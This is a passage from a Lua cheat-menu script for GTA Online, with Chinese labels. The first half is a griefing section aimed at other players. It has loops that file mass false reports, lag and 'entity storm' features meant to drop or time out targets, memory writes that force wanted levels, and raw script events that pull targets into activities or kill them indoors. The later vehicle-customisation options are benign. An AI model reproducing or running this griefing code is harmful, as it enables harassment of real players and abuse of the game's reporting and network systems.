            local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)
            
            if PED.IS_PED_IN_ANY_VEHICLE(player, true) then
                util.toast("玩家在载具中. :/")
                menu.set_value(glitchforcefield_toggle, false);
            break end
            
            local stupid_object = entities.create_object(glitch_hash, playerpos)
            ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
            ENTITY.SET_ENTITY_INVINCIBLE(stupid_object, true)
            ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)
            util.yield()
            entities.delete_by_handle(stupid_object)
            util.yield()    
        end
    end)

	menu.toggle(jindianegao,"循环举报", {"reportthenoob"}, "会变卡", function(on)
		spam = on
		while spam do
			if pid ~= players.user() then
				menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reporthate " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportexploits " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportbugabuse " .. PLAYER.GET_PLAYER_NAME(pid))
			end
			util.yield()
		end
	end)

    menu.action(jindianegao, "消防栓大喷水", {}, "", function()
        util.request_model(200846641)
        local objects = {}
        for i = 1, 40 do
            local coords<const> = players.get_position(pid)
            objects[#objects + 1] = entities.create_object(200846641, v3.new(coords.x + math.random(-5, 5), coords.y + math.random(-5, 5), coords.z))
            util.yield()
        end
        util.yield(3000)
        for i = 1, 4 do
            local coords<const> = players.get_position(pid)
            FIRE.ADD_EXPLOSION(coords.x + math.random(-3, 3), coords.y + math.random(-3, 3), coords.z, 64, 100, true, true, 0.5, true)
            util.yield(400)
        end
        util.yield(5000)
        for i = 1, #objects do
            entities.delete_by_handle(objects[i])
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(200846641)
    end)

    menu.toggle_loop(jindianegao, "烟雾掉帧", {"lag"}, "大部分菜单未检测", function()
        smokelagg(pid) 
    end)

    menu.toggle(jindianegao, "撒尿", {"peeloop"}, "随地大小便应该遭到谴责", function(state)
        peeloop_player(pid)
    end)

	menu.toggle(jindianegao, "骑乘", {}, "该玩家不会看到你依附于他们", function (on)
        piggy_back(pid, on)
	end)

    menu.toggle(jindianegao, "附加到玩家", {"peeloop"}, "", function(on)
        if PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid) == players.user_ped() then 
            util.toast("不能附加自己")
            return
        end
        if on then
            ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, 0.0, -0.20, 2, 1.0, 1.0,1, true, true, true, false, 0, true)
        else
            ENTITY.DETACH_ENTITY(players.user_ped(), false, false)
        end
    end)

    menu.action(jindianegao, "掉帧", {""}, "", function()
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)  
        for i = 0, 180 do 
            attachmentveh1 = CreateVehicle(353883353,TargetPlayerPos,0)   
    end
end)

menu.action(jindianegao, "喷射", {"peeloop"}, "", function(state)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local bone_index = PED.GET_PED_BONE_INDEX(player_ped, 0x2e28)
    request_ptfx_asset_peeloop("core_snow")
    GRAPHICS.USE_PARTICLE_FX_ASSET("core_snow")
    ptfx_id = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(
        "cs_mich1_spade_dirt_throw", player_ped, 0, 0, 0, -90, 0, 0, bone_index, 2, false, false, false
    ) 
end)


    menu.click_slider(jindianegao, "给予通缉等级", {}, "", 1, 5, 5, 1, function(val)
        local playerInfo = memory.read_long(entities.handle_to_pointer(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) + 0x10C8)
        while memory.read_uint(playerInfo + 0x0888) < val do
            for i = 1, 46 do
                PLAYER.REPORT_CRIME(pid, i, val)
            end
            util.yield(75)
        end
    end)

    menu.action(jindianegao, "在玩家面前生成隐形坡道", {}, "", function() 
        local ramp_hash = util.joaat("stt_prop_ramp_jump_l")
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player, 0, 10, -2)
        local rot = ENTITY.GET_ENTITY_ROTATION(player, 2)
        request_model(ramp_hash)
    
        local ramp = OBJECT.CREATE_OBJECT(ramp_hash, pos.x, pos.y, pos.z, true, false, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ramp)
    
        ENTITY.SET_ENTITY_VISIBLE(ramp, false)
        ENTITY.SET_ENTITY_ROTATION(ramp, rot.x, rot.y, rot.z + 90, 0, true)
        util.yield(1000)
        entities.delete_by_handle(ramp)
    end)

    menu.action(jindianegao, "核弹", {""}, "", function(on_click)
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza1 = CreateVehicle(1131912276,TargetPlayerPos,0)
        local Object_pizza2 =CreateObject(253279588,TargetPlayerPos)
            TargetPlayerPos.y = TargetPlayerPos.y + 2
            TargetPlayerPos.z = TargetPlayerPos.z + 70 
            ENTITY.SET_ENTITY_ALPHA(Object_pizza1, 255)
            ENTITY.SET_ENTITY_VISIBLE(Object_pizza1, false, 0)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(Object_pizza2,Object_pizza1, 0,  0.0, 0.00, 0.00, 1.0, 1.0,1, true, false, true, false, 0, true)
        util.yield(5000)
        do
        orbital(pid)
        entities.delete_by_handle(Object_pizza1)
        entities.delete_by_handle(Object_pizza2)
      end
end)

menu.toggle_loop(jindianegao, '实体风暴', {'entityStorm'}, '超时他', function ()
    chaoshita(pid) 
end)

menu.action(jindianegao, "生成小查攻击", {}, "", function()
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, 0.0, -1.0, 0.0)
    local objHash = util.joaat("A_C_Chop")
    requestModels(objHash)
    local g_ped = PED.CREATE_PED(PED_TYPE_CIVMALE, objHash, coords.x, coords.y, coords.z, 0, true, false)

    ENTITY.SET_ENTITY_HEADING(g_ped, ENTITY.GET_ENTITY_HEADING(p))
    PED.SET_PED_MONEY(g_ped, 2000)
    PED.SET_PED_MAX_HEALTH(g_ped, 10000)
    ENTITY.SET_ENTITY_HEALTH(g_ped, 10000)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(g_ped, true)
    TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(g_ped, true)
    TASK.TASK_COMBAT_PED(g_ped, p, 0, 16)
    PED.SET_PED_COMBAT_ATTRIBUTES(g_ped, 46, 1)
    PED.SET_PED_AS_ENEMY(g_ped, true)

    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(objHash)
end)

menu.action(jindianegao, "杀死室内玩家", {}, "若此玩家在公寓则无法使用", function()
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(player)

    util.trigger_script_event(1 << pid, {-1388926377, pid, -1762807505, math.random(0, 9999)})
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 1000, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
end)

menu.action(jindianegao, "公寓邀请", {}, "", function()

    util.trigger_script_event(1 << pid, {3592101251, players.user(), pid, 1, 0, -1, 4, 127, 0, 0, 0}) 

end)

menu.action(jindianegao, "随机任务邀请", {}, "", function()

    util.trigger_script_event(1 << pid, {36077543, players.user(), pid, 1, 7}) 

end)

menu.action(jindianegao, "佩里科岛(有过场动画)", {"tpcayo"}, "", function()

    util.trigger_script_event(1 << pid, {-3696723088, pid, 0, 0, 0, 0, 0})

end)

menu.action(jindianegao, "佩里科岛(无过场动画)", {"tpcayo2"}, "", function()

    util.trigger_script_event(1 << pid, {-369672308, pid,1, 0, 0, 1, 1})

end)


menu.action(jindianegao, "强制赌场剧情动画", {""}, "", function()

    util.trigger_script_event(1 << pid, {2139870214, pid, 2, 0, 0, 4, 0})

end)

menu.action(jindianegao, "显示新手教程", {}, "", function()
    local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
    util.trigger_script_event(1 << pid, {-95341040, players.user(), 20, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
    util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
end)

menu.action(jindianegao, "发送高尔夫", {}, "", function()
    local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
    util.trigger_script_event(1 << pid, {-95341040, players.user(), 193, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
    util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
end)

menu.action(jindianegao, "发送飞行学校", {}, "", function()
    local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
    util.trigger_script_event(1 << pid, {-95341040, players.user(), 196, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
    util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
end)

menu.action(jindianegao, "发送飞镖游戏", {}, "", function()
    local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
    util.trigger_script_event(1 << pid, {-95341040, players.user(), 192, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
    util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
end)

menu.action(jindianegao, "发送竞赛与追逐游戏", {}, "", function()
    local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
    util.trigger_script_event(1 << pid, {-95341040, players.user(), 210, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
    util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
end)

menu.action(jindianegao, "发送巫师废墟游戏", {}, "", function()
    local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
    util.trigger_script_event(1 << pid, {-95341040, players.user(), 212, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
    util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
end)

menu.action(jindianegao, "发送荒地复仇2游戏", {}, "", function()
    local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
    util.trigger_script_event(1 << pid, {-95341040, players.user(), 211, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
    util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
end)

menu.action(jindianegao, "发送太空猴3游戏", {}, "", function()
    local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
    util.trigger_script_event(1 << pid, {-95341040, players.user(), 216, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
    util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
end)

menu.action(jindianegao, "发送Qub3D游戏", {}, "", function()
    local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
    util.trigger_script_event(1 << pid, {-95341040, players.user(), 217, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
    util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
end)

menu.action(jindianegao, "发送猎头游戏", {}, "", function()
    local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
    util.trigger_script_event(1 << pid, {-95341040, players.user(), 218, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
    util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
end)

menu.action(jindianegao, "发送自由模式", {}, "", function()
    local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
    util.trigger_script_event(1 << pid, {-95341040, players.user(), 194, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
    util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
end)

menu.action(jindianegao, "强制1V1", {}, "迫使他们进入1V1", function()
    local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
    util.trigger_script_event(1 << pid, {-95341040, players.user(), 197, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
    util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
end)

menu.action(jindianegao, "掉猴子", {""}, "", function()
    monkey_drop(pid)
end)

menu.action(jindianegao, "掉CXK", {""}, "", function()
    chicken_drop(pid)
end)

    menu.action(jindianegao, "禁用投掷物", {}, "禁止该玩家使用投掷物.", function(toggle) 
        local baseball = util.joaat("weapon_ball")
        request_model(baseball)
        local id = PLAYER.PLAYER_PED_ID()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))

        for i = 1, 60 do
            WEAPON.GIVE_WEAPON_TO_PED(id, baseball, 1, false, false)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z + 5, 0, true, util.joaat("WEAPON_BALL"), PLAYER.PLAYER_PED_ID(), false, true, 0, ped, 0)
        end
        util.yield(500)
        MISC.CLEAR_AREA_OF_PROJECTILES(pos.x, pos.y, pos.z, 400, 0)
    end)

    menu.action(jindianegao, "送进监狱", {}, "将此玩家传送到博林布鲁克监狱", function()
        local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        local my_ped = PLAYER.GET_PLAYER_PED(players.user())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, 1628.5234, 2570.5613, 45.56485, true, false, false, false)
        menu.trigger_commands("givesh " .. players.get_name(pid))
        menu.trigger_commands("summon " .. players.get_name(pid))
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")
        util.yield(5000)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z)
    end)

    menu.action(jindianegao, "关门放狗", {""}, "", function(on_click)
        sendog(pid)
    end)

	menu.action(jindianegao, "掉猴子", {""}, "", function()
        sendmonkey(pid)
    end)
        menu.action(jindianegao, "掉CXK", {""}, "", function()
        sendcxk(pid)
    end)

    local friendly = menu.list(playerMain, "友好选项", {}, "")
    local pvehmenu = menu.list(friendly, '载具', {}, '如果你离的太远,你只会看着它们完成任务')

    local firw = {speed = 1000}
    menu.toggle_loop(friendly, '烟火秀', {'firew'}, '在该玩家位置开始一场烟火秀', function ()
          local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
          local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
          local weap = util.joaat('weapon_firework')
          WEAPON.REQUEST_WEAPON_ASSET(weap)
          for y = 0, 1 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 4.0, tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(10, 15), 200, 0, weap, 0, false, false, firw.speed)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 4.0, tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(10, 15), 200, 0, weap, 0, false, false, firw.speed)
            FIRE.ADD_EXPLOSION(tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(50, 75), 38, 1, false, false, 0, false)
            FIRE.ADD_EXPLOSION(tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(50, 75), 38, 1, false, false, 0, false) 
        end


          if not players.exists(pid) then
              util.stop_thread()
          end
      end)

    menu.toggle_loop(friendly, '假钱雨', {}, '在玩家头上生成假钱袋', function ()
        local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
        Streamptfx('core')
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD( 'ent_brk_banknotes', tar1.x, tar1.y, tar1.z + 1, 0, 0, 0, 3.0, true, true, true)
        if not players.exists(pid) then
        util.stop_thread()
        end
    end)

    menu.action(friendly, '极力保护', {'max'}, '一次性为该玩家提供自动恢复/给予所有武器/永不通缉的保护', function ()
        menu.trigger_commands("bail".. players.get_name(pid))
        menu.trigger_commands("autoheal".. players.get_name(pid))
        menu.trigger_commands("arm".. players.get_name(pid))
        menu.trigger_commands("givevehgodmode".. players.get_name(pid))
    end, nil, nil, COMMANDPERM_FRIENDLY)

    menu.action(friendly, '传送玩家到目的地', {'tele'}, '将玩家传送到玩家在他们的地图上设置的航路点（支架用户必须在车辆中）可以被其他人使用，并且如果设置了航路点将重置您的航路点', function ()
       local x, y, z, b = players.get_waypoint(pid)
       if HUD.IS_WAYPOINT_ACTIVE() then
        local curway = HUD.GET_BLIP_INFO_ID_COORD(HUD.GET_FIRST_BLIP_INFO_ID(8))
        HUD.SET_WAYPOINT_OFF()
        HUD.SET_NEW_WAYPOINT(x, y)
        menu.trigger_commands("WPTP".. players.get_name(pid))
        util.yield(1500)
        HUD.SET_NEW_WAYPOINT(curway.x, curway.y)
        else
            HUD.SET_NEW_WAYPOINT(x, y)
            menu.trigger_commands("WPTP".. players.get_name(pid))
            HUD.SET_WAYPOINT_OFF()
       end

    end, nil, nil, COMMANDPERM_FRIENDLY)

    local winmenu = menu.list(pvehmenu, '窗口菜单', {}, '如果你靠近他们，效果会更好/更快')

    menu.action(winmenu, '卷起所有窗口', {'rolluwin'}, '立即卷起所有窗口', function ()
        GetPlayVeh(pid, function ()
            Rollaup(pid)
        end)
    end, nil, nil, COMMANDPERM_FRIENDLY)

    menu.action(winmenu, '滚下所有窗户', {'rolldwin'}, '立即卷起所有窗口', function ()
        GetPlayVeh(pid, function ()
            Rolladown(pid)
        end)
    end, nil, nil, COMMANDPERM_FRIENDLY)

    menu.list_action(winmenu, '收起单个窗口', {''}, '收起单个窗口', Windows,
    function(index)
        local win = index - 1
        GetPlayVeh(pid, function ()
            Rolluindivid(pid, win)
        end)
    end)

    menu.list_action(winmenu, '打开单个窗口', {''}, '打开单个窗口', Windows,
    function(index)
        local win = index - 1
        GetPlayVeh(pid, function ()
            Rolldindivid(pid, win)
        end)
    end)

    local lscm = menu.list(pvehmenu, '洛圣都改车王', {}, '如果你靠近他们，效果会更好/更快')

    local bodym = menu.list(lscm, '身体改造', {}, '仅显示可更改的内容。 如果他们乘坐新车退出车身改装以刷新选项')

    local lighm = menu.list(lscm, '灯', {}, '')

    local colm  = menu.list(lscm, '车辆颜色', {}, '')

    local wmenu = menu.list(lscm, '车轮', {}, '')

    local vehmenus = {}

        menu.on_focus(bodym, function ()
            for _, m in ipairs(vehmenus) do
                menu.delete(m)
            end
            vehmenus = {}
            if not players.exists(pid) then
                util.stop_thread()
            end
            GetPlayVeh(pid, function ()
            local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
            if PED.IS_PED_IN_ANY_VEHICLE(pedm, false) then    
               
                for _, v in pairs(Vehopts) do
                    local current = VEHICLE.GET_VEHICLE_MOD(vmod, v[1] -1)
                    local maxmods = Getmodcou(pid, v[1] - 1)
                    if maxmods > 0  then
                        local modnames = v[2]
                        local s = menu.slider(bodym, modnames , {''}, '',  -1, maxmods  , current, 1, function (mod)
                            GetPlayVeh(pid, function ()
                            Changemod(pid, v[1] -1, mod)
                            end)
                        end)
              
                     
                      table.insert(vehmenus, s)
                    util.yield()
                    end
                end

                  for i, v in pairs(Vehtogs) do
                    local current = VEHICLE.IS_TOGGLE_MOD_ON(vmod, v[1] -1)
                    local tognames = v[2]
                    local t = menu.toggle(bodym, tognames, {''}, '', function (on)
                        VEHICLE.TOGGLE_VEHICLE_MOD(vmod, v[1] - 1, on)
                      end, current)         
                    table.insert(vehmenus, t)
                  util.yield()
                end
            end
        end)
    end)
           

    local color = {}


    menu.list_select(colm, '原色', {''}, '更改车辆的原色', Mainc, 1, 
    function (t)
        color.prim = t - 1
        GetPlayVeh(pid, function ()
            Changecolor(pid, color)
        end)
    end)

    menu.list_select(colm, '二次色', {''}, '更改车辆的次要颜色', Mainc, 1, 
    function (t)
        color.sec = t - 1
        GetPlayVeh(pid, function ()
            Changecolor(pid, color)
        end)
    end)

    menu.list_select(colm, '珠光色', {''}, '更改载具上的珠光颜色', Mainc, 1, 
    function (t)
        color.per = t - 1
        GetPlayVeh(pid, function ()
            Changewhepercolor(pid, color)
        end)
    end)
   
    menu.list_select(colm, '车轮颜色', {''}, '更改车辆上的车轮颜色', Mainc, 1, 
    function (t)
        color.whe = t - 1
        GetPlayVeh(pid, function ()
            Changewhepercolor(pid, color)
        end)
    end)

    menu.list_select(colm, '内饰颜色', {''}, '更改车辆的内部颜色', Mainc, 1, 
    function (t)
        color.int = t - 1
        GetPlayVeh(pid, function ()
            Changeintcolor(pid, color.int)
        end)
    end)

    menu.list_select(colm, '仪表板颜色', {''}, '更改车辆上的仪表板颜色', Mainc, 1, 
    function (t)
        color.das = t - 1
        GetPlayVeh(pid, function ()
            Changedashcolor(pid, color.das)
        end)
    end)

    
    menu.list_select(lighm, '霓虹灯', {''}, '将霓虹灯更改为不同的颜色', Mainc, 1, 
    function(c)
        local ncolor = c - 1
        GetPlayVeh(pid, function ()
            Changeneon(pid, ncolor)
        end)
    end)


    menu.list_select(lscm, '窗口色调', {''}, '改变车辆的色调', Til, 1, 
    function (t)
        local tint = t - 1
        GetPlayVeh(pid, function ()
            Changetint(pid, tint)
        end)
        
    end)



    
    menu.list_select(lighm, '头灯', {''}, '将大灯更改为不同的颜色', Lighc, 1, 

    function(c)
        local hcolor = c - 1

        GetPlayVeh(pid, function ()
            Changehead(pid, hcolor)
        end)
    end)


    
local nrgb = {color= {r= 0, g = 1, b = 0, a = 1}}

    menu.action(lighm, '改变 RGB 霓虹灯', {}, '将霓虹灯的颜色更改为您选择的 RGB', function ()

        GetPlayVeh(pid, function ()
            local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Nuts Method"))
            local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
            GetControl(vmod, spec, pid)
            RGBNeonKit(pedm)
            local red = nrgb.color.r * 255
            local green = nrgb.color.g * 255
            local blue = nrgb.color.b * 255
            VEHICLE.SET_VEHICLE_NEON_COLOUR(vmod, red, green, blue)
            if not spec then
                Specoff(pid)
            end
        end)
    end)


    menu.colour(lighm, 'RGB 霓虹色', {'rgbsc'}, '选择霓虹灯的颜色更改为 ', nrgb.color, false, function(ncolor)
        nrgb.color = ncolor
    end)

    menu.list_select(wmenu, '本尼斯定制', {''}, '将车轮更换为 Bennys Bespoke 车轮', Bbw, 1, 
    function(w)
        local wheel = w - 1
        GetPlayVeh(pid, function ()
            Changewheel(pid, 9, wheel)
        end)
        
    end)

    menu.list_select(wmenu, '本尼原件', {''}, '将车轮更换为 Bennys Originals 车轮', Bow, 1,
    function(w)
        local wheel = w - 1
        GetPlayVeh(pid, function ()
            Changewheel(pid, 8, wheel)
        end)
        
    end)

    menu.list_select(wmenu, '自行车', {''}, '将车轮改为自行车（摩托车）车轮', Bw, 1,
    function(w)
        local wheel = w - 1
        GetPlayVeh(pid, function ()
            Changewheel(pid, 6, wheel)
        end)
    end)

    menu.list_select(wmenu, '高端', {''}, '将车轮更改为高端车轮', Hew, 1,
    function(w)
        local wheel = w - 1
        GetPlayVeh(pid,  function ()
            Changewheel(pid, 7, wheel)
        end)
    end)

    menu.list_select(wmenu, '低骑者', {''}, '将车轮更改为 Lowrider 车轮', Lw, 1,
    function(w)
        local wheel = w - 1
        GetPlayVeh(pid, function ()
            Changewheel(pid, 2, wheel)
        end)
    end)

    menu.list_select(wmenu, '肌肉', {''}, '将轮子改为肌肉轮', Mw, 1,
    function(w)
        local wheel = w - 1
        GetPlayVeh(pid, function ()
            Changewheel(pid, 1, wheel)
        end)
    end)

    menu.list_select(wmenu, '越野', {''}, '将车轮更改为越野车轮', Orw, 1,
    function(w)
        local wheel = w - 1
        GetPlayVeh(pid, function ()
            Changewheel(pid, 4, wheel)
        end)
    end)

    menu.list_select(wmenu, '赛车（一级方程式车轮）', {''}, '将车轮更改为赛车（一级方程式车轮）车轮', Rw, 1,
    function(w)
        local wheel = w - 1
        GetPlayVeh(pid,  function ()
            Changewheel(pid, 10, wheel)
        end)
    end)

    menu.list_select(wmenu, '运动', {''}, '将车轮更改为运动车轮', Spw, 1,
    function(w)
        local wheel = w - 1
        GetPlayVeh(pid,  function ()
            Changewheel(pid, 0, wheel)
        end)
    end)
    
    menu.list_select(wmenu, '街道', {''}, '将车轮更改为街道车轮', Stw, 1,
    function(w)
        local wheel = w - 1
        GetPlayVeh(pid, function ()
            Changewheel(pid, 11, wheel)
        end)
    end)

    menu.list_select(wmenu, '越野车', {''}, '将车轮改为 SUV 车轮', Suw, 1,
    function(w)
        local wheel = w - 1
        GetPlayVeh(pid,  function ()
            Changewheel(pid, 3, wheel)
        end)
    end)

    menu.list_select(wmenu, '追踪', {''}, '将轮子更改为履带轮', Trw, 1,
    function(w)
        local wheel = w - 1
        GetPlayVeh(pid,  function ()
            Changewheel(pid, 12, wheel)
        end)
    end)

    menu.list_select(wmenu, '调谐器', {''}, '将车轮更改为调谐器车轮', Tuw, 1,
    function(w)
        local wheel = w - 1
        GetPlayVeh(pid, function ()
            Changewheel(pid, 5, wheel)
        end)
    end)


    menu.action(pvehmenu, '最大化他们的车辆', {'maxv'}, '以更高的最高速度最大化他们的车辆（每次按下时都会在车辆上放置随机轮子）', function ()
        GetPlayVeh(pid,  function ()
            Maxoutcar(pid)
        end)
     end, nil, nil, COMMANDPERM_FRIENDLY)


    menu.text_input(pvehmenu, '更改他们的车牌', {'lplate'}, '将车牌更改为自定义文本', function (cusplate)
        GetPlayVeh(pid,  function ()
           Platechange(cusplate, pid)
        end)
    end)


    menu.action(pvehmenu, '修车', {'repv'}, '修理他们的车辆', function ()
        GetPlayVeh(pid,  function ()
            Fixveh(pid)
        end)
     end, nil, nil, COMMANDPERM_FRIENDLY)

     
     menu.click_slider(pvehmenu, '加速车辆', {'accel'}, '按您设定的速度加速车辆前进（实际速度大约是 MPH 的两倍）', 10, 150, 40, 10, function (s)
       local  speed = s
        GetPlayVeh(pid, function ()
           Accelveh( speed, pid)
           util.yield(1000)
        end)
    end)

    menu.toggle_loop(pvehmenu, '车辆减速', {'slowv'}, '不冻结它们只会减慢车辆速度', function ()
    local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Nuts Method"))
        Specon(pid)
        GetPlayVeh(pid, function ()
            Stopveh(pid)
        end)
        return spec
    end, function ()
        local spec = menu.get_value(menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Nuts Method"))
        if not spec then
